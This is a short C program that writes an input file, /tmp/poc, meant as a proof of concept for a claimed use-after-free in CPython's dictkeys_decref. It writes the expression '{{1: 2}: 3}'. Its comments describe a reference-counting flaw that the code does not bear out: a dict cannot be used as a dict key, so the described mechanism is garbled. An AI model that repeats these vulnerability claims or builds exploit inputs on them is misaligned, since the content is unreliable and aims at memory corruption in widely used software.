#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    // Craft a Python expression that creates a dict where the key is a dict.
    // The key dict is created first, then the outer dict is built around it.
    // When the outer dict is deallocated, it decrefs its key (the inner dict).
    // However, due to the reference counting bug in dictkeys_decref, the inner
    // dict's keys are freed while the inner dict itself is still alive,
    // leading to a use-after-free when the inner dict's refcount is checked.
    // Use a format that forces the inner dict to be created as a temporary
    // and then immediately dropped, leaving a dangling reference in the outer dict.
    fprintf(f, "{{1: 2}: 3}");
    fputc('\0', f);
    fclose(f);
    return 0;
}